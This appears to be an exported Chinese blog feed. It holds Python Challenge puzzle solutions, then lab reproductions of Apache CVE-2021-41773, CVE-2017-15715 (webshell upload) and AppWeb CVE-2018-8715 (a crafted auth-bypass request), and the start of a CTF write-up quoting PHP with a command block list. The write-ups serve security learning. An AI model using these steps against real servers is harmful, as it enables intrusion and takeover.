<p>因此，最终代码如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re  </span><br><span class="line">res = <span class="string">&#x27;1&#x27;</span>  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):  </span><br><span class="line">    res = <span class="string">&quot;&quot;</span>.join([<span class="built_in">str</span>(<span class="built_in">len</span>(i+j))+i <span class="keyword">for</span> i, j <span class="keyword">in</span> re.findall(<span class="string">r&#x27;(\d)(\1*)&#x27;</span>, res)])  </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(res))</span><br></pre></td></tr></table></figure></p>
<h1 id="level-11">level 11</h1>
<h2 id="题目信息-11">题目信息</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220202111336.png" /></p>
<p>注意网站名字：<code>odd even</code></p>
<p>本题只有两个信息：</p>
<ol type="1">
<li>图片</li>
<li><code>odd even</code> 也就是奇数，偶数</li>
</ol>
<p>猜测：<strong>把图中奇数和偶数的像素点分开</strong></p>
<h2 id="方法-12">方法</h2>
<p>代码如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image  </span><br><span class="line">path = <span class="string">&#x27;attachments/level_11/cave.jpg&#x27;</span>  </span><br><span class="line">img = Image.<span class="built_in">open</span>(path)  </span><br><span class="line">odd = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (img.width, img.height))  </span><br><span class="line">even = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (img.width, img.height))  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(img.width):  </span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(img.height):  </span><br><span class="line">		pixel = img.getpixel((i, j))  </span><br><span class="line">        <span class="keyword">if</span> (i + j) % <span class="number">2</span> == <span class="number">1</span>: <span class="comment"># odd  </span></span><br><span class="line">			odd.putpixel((i, j), pixel)  </span><br><span class="line">        <span class="keyword">else</span>:   <span class="comment"># even</span></span><br><span class="line">			even.putpixel((i, j), pixel)  </span><br><span class="line"></span><br><span class="line">odd.show()  </span><br><span class="line">even.show()</span><br></pre></td></tr></table></figure></p>
<p>得到两张图片： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220202111705.png" /></p>
<p>右边那张中有 <code>evil</code> 字样。因此修改 url： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：http://www.pythonchallenge.com/pc/return/5808.html</span><br><span class="line">修改后：http://www.pythonchallenge.com/pc/return/evil.html</span><br></pre></td></tr></table></figure></p>
<h1 id="level-12">level 12</h1>
<h2 id="题目信息-12">题目信息</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220203091240.png" /></p>
<p>查看源码，点击图片链接发现： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.pythonchallenge.com/pc/return/evil1.jpg</span><br></pre></td></tr></table></figure></p>
<p>后面有数字，猜想把数字改一下会不会有其他图片，果不其然。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220203091406.png" alt="evil2.jpg" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220203091619.png" /></p>
<p>以上分别是2，3。注意到2，将后缀修改会下载得到一个文件。其实4还是有的，访问的时候并不是显示没有文件，而是显示 <code>因存在错误而无法显示</code>，利用下面命令访问： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -u huge:file http://www.pythonchallenge.com/pc/return/evil4.jpg</span><br></pre></td></tr></table></figure></p>
<p>得到一句话 <code>Bert is evil! go back!</code>。这么看来，信息应该就在刚刚下载的文件里。</p>
<p>注意到第一张图片中将牌分为了 5 叠（dealing the cards into 5 stacks），根据网站名 <code>deal evil</code> ，那么猜测：<strong>将下载的文件数据也分为 5 叠。</strong></p>
<h2 id="方法-13">方法</h2>
<p>代码如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">path = <span class="string">&#x27;attachments/level_12/evil2.gfx&#x27;</span></span><br><span class="line">data = <span class="built_in">open</span>(path, <span class="string">&#x27;rb&#x27;</span>).read()  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):  </span><br><span class="line">    <span class="built_in">open</span>(<span class="string">&#x27;attachments/level_12/%d.jpg&#x27;</span> % i, <span class="string">&#x27;wb&#x27;</span>).write(data[i::<span class="number">5</span>])</span><br></pre></td></tr></table></figure></p>
<p>结果： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220203093800.png" /></p>
<p>由于 4 被划掉，不做考虑。分别是：<code>dis, pro, port, ional</code> ，修改 url： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：http://www.pythonchallenge.com/pc/return/evil.html</span><br><span class="line">修改后：http://www.pythonchallenge.com/pc/return/disproportional.html</span><br></pre></td></tr></table></figure></p>
<h1 id="level-13">level 13</h1>
<h2 id="题目信息-13">题目信息</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220203101659.png" /></p>
<p>查看页面源码发现： - <code>phone that &lt;remote /&gt; evil</code> - <code>5</code> 可以点击，结果为：<code>faultCode 105 faultString XML error 5: empty document</code></p>
<p>查询 stack overflow，这个报错的信息是因为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">It looks from the response like you didn&#x27;t submit an xml &#x27;request&#x27; document to the url. XMLRPC requires that you post a request in the form of commands via an xml file.</span><br><span class="line"></span><br><span class="line">没有提交 xml 请求。</span><br></pre></td></tr></table></figure></p>
<p>故可以利用 xmlrpc 库请求。</p>
<h2 id="方法-14">方法</h2>
<p>先查看有哪些方法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xmlrpc.client  </span><br><span class="line">connect = xmlrpc.client.ServerProxy(<span class="string">&#x27;http://www.pythonchallenge.com/pc/phonebook.php&#x27;</span>)  </span><br><span class="line"><span class="built_in">print</span>(connect.system.listMethods())</span><br><span class="line">````</span><br><span class="line"></span><br><span class="line">结果：</span><br></pre></td></tr></table></figure> ['phone', 'system.listMethods', 'system.methodHelp', 'system.methodSignature', 'system.multicall', 'system.getCapabilities'] <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">（注意到 `phone`）</span><br><span class="line"></span><br><span class="line">查看 phone 方法的**帮助**和**输入与输出**：</span><br><span class="line">```python</span><br><span class="line">print(connect.system.methodHelp(&#x27;phone&#x27;))  </span><br><span class="line">print(connect.system.methodSignature(&#x27;phone&#x27;))</span><br></pre></td></tr></table></figure></p>
<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Returns the phone of a person</span><br><span class="line">[[&#x27;string&#x27;, &#x27;string&#x27;]]</span><br></pre></td></tr></table></figure></p>
<p>该方法需要输入一个字符串，返回一个字符串。那么输入的字符串应该是人名，而返回的字符串应该是对应的电话号码。注意到上一关的 <code>Bert is evil! go back!</code>，那么这里应该输入 <code>Bert</code>： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(connect.phone(<span class="string">&#x27;Bert&#x27;</span>))</span><br></pre></td></tr></table></figure></p>
<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">555-ITALY</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>冷知识：<code>555</code> basically means "fake phone numbers" in US...</p>
</blockquote>
<p>因此修改 url： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：http://www.pythonchallenge.com/pc/return/disproportional.html</span><br><span class="line">修改后：http://www.pythonchallenge.com/pc/return/italy.html</span><br></pre></td></tr></table></figure></p>
<h1 id="level-14">level 14</h1>
<h2 id="题目信息-14">题目信息</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220203110227.png" /></p>
<p>查看页面源码： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220203110246.png" /></p>
<p>访问 wire.png ，发现真正的尺寸是 10000 * 1。</p>
<p>总结一下信息：</p>
<ol type="1">
<li><code>100*100 = (100+99+99+98) + (...</code></li>
<li>wire.png 是 <code>10000*1</code>，而显示出来的是 <code>100*100</code></li>
<li>HTML 标题为 <code>walk around</code></li>
</ol>
<p>猜测：<strong>将 <code>10000*1</code> 的图片按某种方式卷起来，形成一个 <code>100*100</code> 的图片，卷的方式应该就是 <code>(100+99+99+98) + (..</code>。就是类似这样：</strong> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220203111001.png" /> （先向右100，然后向下99，向左99，向上98；向右98 ...）</p>
<h2 id="方法-15">方法</h2>
<p>代码如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw  </span><br><span class="line">path = <span class="string">&#x27;attachments/level_14/wire.png&#x27;</span>  </span><br><span class="line">img = Image.<span class="built_in">open</span>(path)  </span><br><span class="line"><span class="built_in">print</span>(img.size, img.mode, img.<span class="built_in">format</span>)  </span><br><span class="line">out = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (<span class="number">100</span>, <span class="number">100</span>))  </span><br><span class="line">d = <span class="number">200</span>  </span><br><span class="line">delta = [(<span class="number">1</span>, <span class="number">0</span>), (<span class="number">0</span>, <span class="number">1</span>), (-<span class="number">1</span>, <span class="number">0</span>), (<span class="number">0</span>, -<span class="number">1</span>)]  </span><br><span class="line">x, y, i = -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>  <span class="comment"># 因为第一次要 +100，所以 x 初始为 -1</span></span><br><span class="line"><span class="keyword">while</span> d/<span class="number">2</span> &gt; <span class="number">0</span>:  </span><br><span class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> delta:  </span><br><span class="line">        steps = d // <span class="number">2</span></span><br><span class="line">		<span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(steps):  </span><br><span class="line">            x, y = x + v[<span class="number">0</span>], y + v[<span class="number">1</span>]  </span><br><span class="line">            out.putpixel((x, y), img.getpixel((i, <span class="number">0</span>)))  </span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">		d -= <span class="number">1</span>  </span><br><span class="line">out.show()</span><br></pre></td></tr></table></figure></p>
<p>结果： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220203111203.png" /></p>
<p>当访问 <code>http://www.pythonchallenge.com/pc/return/cat.html</code> 时，出现：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220206223856.png" /></p>
<p>因此用 uzi 替代 cat，修改 url： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：http://www.pythonchallenge.com/pc/return/cat.html</span><br><span class="line">修改后：http://www.pythonchallenge.com/pc/return/uzi.html</span><br></pre></td></tr></table></figure></p>
<h1 id="level-15">level 15</h1>
<h2 id="题目信息-15">题目信息</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220206225138.png" /></p>
<p>查看页面源码： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220206225159.png" /></p>
<p>信息总结：</p>
<ol type="1">
<li>日历上显示的应该是 <code>1xx6</code> 年；</li>
<li>注意最右下角的其实是2月，有 29 天，说明应该是闰年；</li>
<li>他不是最年轻的，而是第二年轻的</li>
<li>要做的事：为明天买花</li>
<li>网页标题：<code>whom?</code></li>
</ol>
<p>猜测：需要通过生日找出这个人是谁。</p>
<h2 id="方法-16">方法</h2>
<ol type="1">
<li>找出 1006 到 1996 之间的满足 1.26 是周一的所有闰年。代码如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime, calendar  </span><br><span class="line"><span class="keyword">for</span> year <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1006</span>, <span class="number">1997</span>, <span class="number">10</span>):  </span><br><span class="line">    d = datetime.date(year, <span class="number">1</span>, <span class="number">26</span>)  </span><br><span class="line">    <span class="keyword">if</span> d.isoweekday() == <span class="number">1</span> <span class="keyword">and</span> calendar.isleap(year):  <span class="comment"># 判断是否为闰年，1，26是否为周一</span></span><br><span class="line">        <span class="built_in">print</span>(d)</span><br></pre></td></tr></table></figure></li>
</ol>
<p>结果为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1176-01-26</span><br><span class="line">1356-01-26</span><br><span class="line">1576-01-26</span><br><span class="line">1756-01-26</span><br><span class="line">1976-01-26</span><br></pre></td></tr></table></figure></p>
<p>然后，根据 "他不是最年轻的，而是第二年轻的"，猜测应该是 1756 年，最年轻的是1956年。，再根据"要做的事：为明天买花"，猜测他的生日应该是 1756.1.27，百度发现，那天是莫扎特（Mozart）的生日，修改 url： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：http://www.pythonchallenge.com/pc/return/uzi.html</span><br><span class="line">修改后：http://www.pythonchallenge.com/pc/return/mozart.html</span><br></pre></td></tr></table></figure></p>
<h1 id="附录">附录</h1>
<ol type="1">
<li>网址：<a href="http://www.pythonchallenge.com/">python challenge</a></li>
<li>解法：<a href="https://www.hackingnote.com/en/python-challenge-solutions/overview">python challenge solutions</a></li>
</ol>
]]></content>
      <categories>
        <category>python</category>
        <category>刷题</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>复现：Apache HTTP Server 2.4.49 路径穿越漏洞（CVE-2021-41773）</title>
    <url>/2022/03/24/%E5%A4%8D%E7%8E%B0%EF%BC%9AApache%20HTTP%20Server%202.4.49%20%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-41773%EF%BC%89/</url>
    <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
<span id="more"></span>
<h1 id="漏洞信息">漏洞信息</h1>
<p>Apache HTTP Server是Apache基金会开源的一款流行的HTTP服务器。在其2.4.49版本中，引入了一个路径穿越漏洞，满足下面两个条件的Apache服务器将会受到影响：</p>
<ul>
<li><p>版本等于2.4.49</p></li>
<li><p>穿越的目录允许被访问，比如配置了<code>&lt;Directory /&gt;Require all granted&lt;/Directory&gt;</code>。（默认情况下是不允许的）</p></li>
</ul>
<p>攻击者利用这个漏洞，可以读取位于Apache服务器Web目录以外的其他文件，或者读取Web目录中的脚本文件源码，或者在开启了cgi或cgid的服务器上执行任意命令。</p>
<p>参考链接：</p>
<ul>
<li><p>https://httpd.apache.org/security/vulnerabilities_24.html</p></li>
<li><p>https://twitter.com/ptswarm/status/1445376079548624899</p></li>
<li><p>https://twitter.com/HackerGautam/status/1445412108863041544</p></li>
<li><p>https://twitter.com/snyff/status/1445565903161102344</p></li>
</ul>
<p>路径：</p>
<ul>
<li><code>vulhub-master/httpd/CVE-2021-41773</code></li>
</ul>
<p>运行漏洞环境：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build  </span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
<p>然后输入：<code>http://ip:8080</code> 即可访问</p>
<h1 id="复现">复现</h1>
<p>进入环境，显示如下则环境搭建成功。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324231656.png" /></p>
<p>先刷新，抓个包，然后将请求地址修改为如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324231754.png" /></p>
<p>结果如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324231803.png" /></p>
<p>成功得到文件的内容，因此证明存在此漏洞。</p>
<p>需要注意的是，<code>icons</code> 需要为目标主机存在且可访问的目录。<code>%2e</code> 是 <code>.</code> 的 url 编码，如果直接在浏览器输入的话，要输入 <code>.</code> 。</p>
<p>接下来改变请求的方式，发送如下请求：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324232016.png" /></p>
<p>结果如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324232026.png" /></p>
<p>成功执行命令。</p>
<h1 id="总结">总结</h1>
<p>今天刷的一套题就是类似的路径穿越漏洞（<a href="https://buuoj.cn/challenges">BUUCTF</a> 中的 <strong>我有一个数据库</strong>），这类的题目还是需要平时多记录。</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Apache</tag>
      </tags>
  </entry>
  <entry>
    <title>复现：Apache HTTPD 换行解析漏洞（CVE-2017-15715）</title>
    <url>/2022/03/21/%E5%A4%8D%E7%8E%B0%EF%BC%9AApache%20HTTPD%20%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-15715%EF%BC%89/</url>
    <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
<span id="more"></span>
<h1 id="漏洞信息">漏洞信息</h1>
<p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其<strong>2.4.0~2.4.29版本</strong>中存在一个解析漏洞，在解析PHP时，<code>1.php\x0A</code>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
<p>Path：https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715</p>
<p>运行漏洞环境： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></p>
<p>然后输入：<code>http://ip:8080</code> 即可访问</p>
<h1 id="复现">复现</h1>
<p>上传一个木马，发现被拦截： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094109.png" /></p>
<p>此时修改 24 行那，首先添加一个字符，然后选定，此时右边会有编码的区域。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094419.png" /></p>
<p>在 code 那块写上 0a（ascii码表的换行符的16进制），然后点击 <code>apply changes</code> 。此时就加入了一个换行符 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094602.png" /></p>
<p>然后再次发送该数据包，此时成功发送。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094636.png" /></p>
<p>访问 <code>http"//ip:8080/shell.php%0a</code>，发现能够访问，说明文件上传成功。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094816.png" /></p>
<p>利用蚁剑连接 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094907.png" /></p>
<p>成功获得 webshell。</p>
<h1 id="总结">总结</h1>
<p>查看一下源码（关键部分） <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$name</span> = basename(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$ext</span> = pathinfo(<span class="variable">$name</span>,PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$ext</span>, [<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;php3&#x27;</span>, <span class="string">&#x27;php4&#x27;</span>, <span class="string">&#x27;php5&#x27;</span>, <span class="string">&#x27;phtml&#x27;</span>, <span class="string">&#x27;pht&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;bad file&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;./&#x27;</span> . <span class="variable">$name</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>换行符绕过了 <code>in_array()</code> 的黑名单过滤。但是 <code>php%0a</code> 并不是 <code>php</code> 文件，不会被执行，这就证明了存在解析漏洞。</p>
<h1 id="资源">资源</h1>
<ol type="1">
<li><a href="https://vulhub.org/#/environments/httpd/CVE-2017-15715/">vulhub</a></li>
<li><a href="https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715">githubVulhub</a></li>
</ol>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Apache</tag>
      </tags>
  </entry>
  <entry>
    <title>复现：AppWeb认证绕过漏洞（CVE-2018-8715）</title>
    <url>/2022/03/22/%E5%A4%8D%E7%8E%B0%EF%BC%9AAppWeb%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-8715%EF%BC%89/</url>
    <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
<span id="more"></span>
<h1 id="漏洞信息">漏洞信息</h1>
<p>AppWeb是Embedthis Software LLC公司负责开发维护的一个基于GPL开源协议的嵌入式Web Server。他使用C/C++来编写，能够运行在几乎先进所有流行的操作系统上。当然他最主要的应用场景还是为嵌入式设备提供Web Application容器。</p>
<p>AppWeb可以进行认证配置，其认证方式包括以下三种：</p>
<ul>
<li>basic 传统HTTP基础认证</li>
<li>digest 改进版HTTP基础认证，认证成功后将使用Cookie来保存状态，而不用再传递Authorization头</li>
<li>form 表单认证</li>
</ul>
<p>其7.0.3之前的版本中，对于digest和form两种认证方式，如果用户传入的密码为<code>null</code>（也就是没有传递密码参数），appweb将因为一个逻辑错误导致直接认证成功，并返回session。</p>
<p>参考链接：</p>
<ul>
<li><a href="https://ssd-disclosure.com/index.php/archives/3676">https://ssd-disclosure.com/index.php/archives/3676</a></li>
</ul>
<p>路径：</p>
<ul>
<li><code>vulhub-master/appweb/CVE-2018-8715</code></li>
</ul>
<p>启动环境：</p>
<ul>
<li><code>sudo docker-compose up -d</code></li>
<li>输入 <code>http://ip:8080</code> 即可访问</li>
</ul>
<p>前提：</p>
<ul>
<li>已知某个用户名为 <code>admin</code></li>
</ul>
<h1 id="复现">复现</h1>
<p>直接访问环境发现需要登录 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322092115.png" /></p>
<p>如果随便输入用户名和密码则会显示 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322093702.png" /></p>
<p>输入用户名 <code>admin</code> 然后抓包，修改为如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 192.168.100.16:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Authorization: Digest username=&quot;admin&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>（最后两个空行很重要！）</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322094537.png" /></p>
<p>获得cookie（经过测试，每发一次上述的数据包，session的值就会+1，并且后面也会有所变化）</p>
<ul>
<li><code>-http-session-=10::http.session::e0fff8835e6f7cfd1848635e08ecb006</code></li>
</ul>
<p>再次输入 <code>admin</code> 然后抓包，设置 cookie 字段。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322094645.png" /></p>
<p>成功登录 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322094704.png" /></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>AppWeb</tag>
      </tags>
  </entry>
  <entry>
    <title>安洵杯 2019 easy_web</title>
    <url>/2022/04/01/%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%20easy_web/</url>
    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境，先检查了源码，发现了返回了一张图片经过base64编码后的内容。并且有一句提示：<code>md5 is funny</code>。然后观察url <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">d835c69c-0e67-4191-8b98-d25591d19b6e.node4.buuoj.cn:81/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</span><br></pre></td></tr></table></figure></p>
<p>注意到两个参数<code>cmd</code>和<code>img</code>。后者的内容像是经过base64编码的，因此先进行解码。推荐网址：https://gchq.github.io/CyberChef/</p>
<p>调用<code>magic</code>模块，发现编码规则，先经过两次base64，然后再进行16进制解码还原原来的字符串。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401220118.png" /></p>
<p>因此，这里可以传入一个文件名。虽然有可能只接受图片，但是作为尝试可以试一下<code>index.php</code>。</p>
<h1 id="解题">解题</h1>
<p>首先将<code>index.php</code>进行编码，然后传入img参数，cmd先保持不变。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401220308.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401220429.png" /></p>
<p>将返回的内容base64解码后得到如下代码（重要部分）： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    header(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line">	</span><br><span class="line"><span class="variable">$file</span> = hex2bin(base64_decode(base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = preg_replace(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)) &#123;      <span class="comment">// img不能含有flag</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixi～ no flag&quot;</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$txt</span> = base64_encode(file_get_contents(<span class="variable">$file</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="variable">$txt</span> . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `<span class="variable">$cmd</span>`;  <span class="comment">// 会将系统命令执行</span></span><br><span class="line">    &#125; </span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span 